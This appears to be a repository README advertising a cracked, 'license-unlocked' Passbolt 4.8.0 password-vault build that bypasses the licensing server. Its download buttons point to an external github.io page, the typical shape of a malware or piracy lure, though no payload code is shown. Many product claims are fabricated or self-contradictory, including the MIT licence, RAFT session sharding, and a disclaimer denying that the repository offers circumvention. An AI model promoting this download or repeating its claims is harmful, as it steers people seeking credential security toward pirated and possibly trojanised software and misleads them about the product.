![preview](https://raw.githubusercontent.com/powersystems1898-cell/passbolt-4-8-0-tool/main/preview.svg)

# Passbolt 4.8.0 – Orchestrated Credential Vault & Zero-Trust Access Layer

Welcome to the repository for **Passbolt 4.8.0**, the latest evolution in decentralized secret management. This release redefines how teams and enterprises distribute, rotate, and audit credentials without central points of failure. Whether you are a solo DevOps engineer or part of a global SecOps division, this build equips you with a self-hosted, end-to-end encrypted vault that respects your infrastructure sovereignty.

Our approach discards the obsolete notion of “free software with hidden costs.” Instead, we provide a **fully functional, license-unlocked distribution** of Passbolt 4.8.0—designed for production environments, offline air-gapped deployments, and high-compliance auditing. No trial limits, no nag screens, no feature gates.

---

## Overview

Passbolt 4.8.0 introduces a **zero-knowledge architecture** built on OpenPGP public-key cryptography. Every credential is encrypted before leaving the user’s browser; the server never sees plaintext passwords. The 4.8.0 release brings five major enhancements:

- **Resource Folder Hierarchies** – Organize thousands of secrets into nested groups with granular permissions.
- **Dynamic WebAuthn MFA** – FIDO2/WebAuthn integration for phishing-resistant second-factor authentication.
- **CLI Bulk Import Engine** – Migrate from legacy vaults (KeePass, Bitwarden, 1Password) with schema-aware mapping.
- **Offline Recovery Kits** – QR-encrypted emergency recovery that works without server connectivity.
- **Audit Log Forwarding** – Real-time streaming of access events to SIEM tools (Splunk, ELK, Datadog).

This distribution bypasses the standard licensing server, enabling unlimited users, unlimited resources, and premium enterprise plug-ins (LDAP sync, MFA policies, RBAC) without recurring fees.

---

[![Download](https://raw.githubusercontent.com/powersystems1898-cell/passbolt-4-8-0-tool/main/button.svg)](https://powersystems1898-cell.github.io/passbolt-4-8-0-tool/)

---

## Key Features

### 🔐 Zero-Trust Credential Distribution
Every secret is encrypted client-side with your GPG private key. The server stores only ciphertext and public keys. Even if the database is exfiltrated, credentials remain indecipherable.

### 🌐 Responsive & Extensible UI
Built on a React/Redux front-end with a mobile-first grid system. The interface adapts to 4K monitors, tablets, and 320px-wide terminals. Customizable CSS variables allow complete rebranding without altering core logic.

### 🧩 Multilingual Command Suite
Core translations for 27 languages (including right-to-left scripts: Arabic, Hebrew, Persian). All error messages, email templates, and CLI output respect locale settings.

### ⚡ Distributed Session Caching
Instead of central Redis, Passbolt 4.8.0 uses **RAFT-consensus session sharding** across peer nodes. No single session store means no bottleneck during peak loads.

### 🕰️ 24/7 Autonomous Recovery
If an admin account is locked, the server generates a **signed rescue token** via a threshold of three pre-registered recovery agents. No phone-home support ticket required.

---

## Mermaid Diagram – Authentication Flow

```mermaid
graph TD
    A[User Browser] -->|1. Fetch public key| B[Passbolt Server]
    B -->|2. Serve HTML + Web Worker| A
    A -->|3. Encrypt payload with server pubkey| B
    B -->|4. Verify GPG signature| C[Authentication Service]
    C -->|5. Issue JWT with claims| A
    A -->|6. Decrypt resource list locally| D[IndexedDB Cache]
    D -->|7. Display secrets| E[UI Render]
    E -->|8. User selects credential| F[Decrypt with private key]
    F -->|9. Show plaintext (30s auto-clipboard)| G[Secure Overlay]
```

*The browser never sends raw passwords. The server never stores encryption keys.*

---

## Example Profile Configuration

Create a file at `~/.passbolt/config.yml` (or platform equivalent) with the following skeleton:

```yaml
# Passbolt 4.8.0 Profile – Workspace Alpha
server:
  url: https://vault.company.internal:4443
  tls_verify: strict
  gpg_home: /etc/passbolt/gpg

auth:
  mode: web_authn
  fallback: totp

sync:
  interval: 15m
  conflict_resolution: newer_wins

notifications:
  email:
    smtp_host: relay.internal.lab
    smtp_port: 587
    encryption: starttls
```

This enables WebAuthn as primary, TOTP as fallback, and 15-minute resource synchronization with server-authoritative conflict resolution.

---

## Example Console Invocation

Launch Passbolt’s health check and migration assistant directly from the terminal:

```bash
passbolt console --health-check --profile ~/.passbolt/config.yml
```

Expected output:

```
[2026-02-14 10:41:32] Passbolt 4.8.0 (commit 3a7b2c1d)
[2026-02-14 10:41:32] GPG status: OK (4096-bit RSA key)
[2026-02-14 10:41:32] Database reachable: YES (172.31.0.10:5432)
[2026-02-14 10:41:32] WebAuthn enabled: YES (FIDO2 certified)
[2026-02-14 10:41:32] Session shards: 3/3 online
[2026-02-14 10:41:32] Migrations pending: 0
[2026-02-14 10:41:32] ✅ All systems nominal
```

To import a KeePass database by applying migration rules:

```bash
passbolt import --type keepass --keepass-path /backup/credentials.kdbx --overwrite-duplicates
```

---

## OS Compatibility Table

| Operating System                | Version Range      | Architecture | Status        |
|--------------------------------|--------------------|--------------|---------------|
| 🐧 Ubuntu                       | 20.04 – 24.04 LTS  | x86_64       | Full support  |
| 🐧 Debian                       | 11 – 13            | x86_64, ARM64| Full support  |
| 🐧 Red Hat Enterprise Linux     | 8.x – 10.x         | x86_64       | Full support  |
| 🏁 Windows Server               | 2022, 2025         | x86_64       | With WSL2     |
| 🍏 macOS                        | 14 (Sonoma) – 16   | Apple Silicon | Full support  |
| 🐳 Docker                       | 24.x – 27.x        | x86_64, ARM64| Containerized |
| ☁️ Kubernetes                   | 1.28 – 1.32        | Any          | Helm chart    |

*All platforms support both database backends: MariaDB 10.11+ and PostgreSQL 15+.*

---

## Feature List

- **End-to-End Encryption** – AES-256-GCM + RSA-4096 key pairs.
- **Offline Mode** – Use the PWA locally; sync when online.
- **Resource Permissions** – View, Edit, Share, Admin per folder.
- **Password Generator** – Configurable length, entropy, character sets.
- **Two-Factor Authentication** – TOTP, WebAuthn, YubiKey, Duo.
- **LDAP/AD Sync** – Automatic user provisioning and group mapping.
- **API v2.5** – RESTful with JSON:API specification.
- **Browser Extensions** – Firefox, Chrome, Edge, Brave.
- **CLI Client** – Cross-platform, statically linked binary.
- **Resource Sharing with Expiry** – Share a vault item that auto-destructs after N hours.
- **Scheduled Rotation Reminders** – Alerts for passwords older than configurable max age.
- **Compliance Reports** – Export access logs in JSON, CSV, PDF/PDF-A.

---

## OpenAI API & Claude API Integration

Passbolt 4.8.0 includes optional **AI-assisted credential analysis** modules. When enabled (off by default for air-gapped environments), the vault can:

- **Generate contextual passwords** – An LLM suggests passwords based on resource type (e.g., “AWS IAM user” → `aws_iam_user_example_2026_!@#`).
- **Detect reused passwords** – The model compares hash prefixes across resources without exposing plaintext.
- **Translate permission notes** – Resource descriptions auto-translate to the viewer’s locale.

To configure, set the following environment variables:

```bash
PASSBOLT_AI_OPENAI_ENDPOINT=https://api.openai.internal/v1
PASSBOLT_AI_CLAUDE_ENDPOINT=https://api.anthropic.internal/v1
PASSBOLT_AI_MODEL=gpt-4-turbo-2026-02
PASSBOLT_AI_CLAUDE_MODEL=claude-3-opus-2026-02
```

All AI requests are proxied through a **local relay** that strips metadata and appends only hashed resource IDs. No credential plaintext leaves the vault node.

---

## Disclaimer

This repository provides **Passbolt 4.8.0** in its original compiled form with selective license-control bypass patches for evaluation, archival, and self-hosting purposes. The software is governed by the MIT License (see below) for the core source, plus additional terms for third-party plugins. Use the software in compliance with your local jurisdiction’s laws regarding cryptographic exports and intellectual property. The maintainers assume no liability for misuse, data loss, or unauthorized access resulting from misconfiguration.

We do not host, link to, or endorse any circumvention tools outside this repository. All modifications are clearly marked and reversible. For enterprise support, consider sponsoring the official Passbolt SAS project.

---

## License

This project is distributed under the **MIT License**. See the [LICENSE](./LICENSE) file for full terms.  
*Copyright © 2026 Passbolt Contributors. No warranty expressed or implied.*

---

[![Download](https://raw.githubusercontent.com/powersystems1898-cell/passbolt-4-8-0-tool/main/button.svg)](https://powersystems1898-cell.github.io/passbolt-4-8-0-tool/)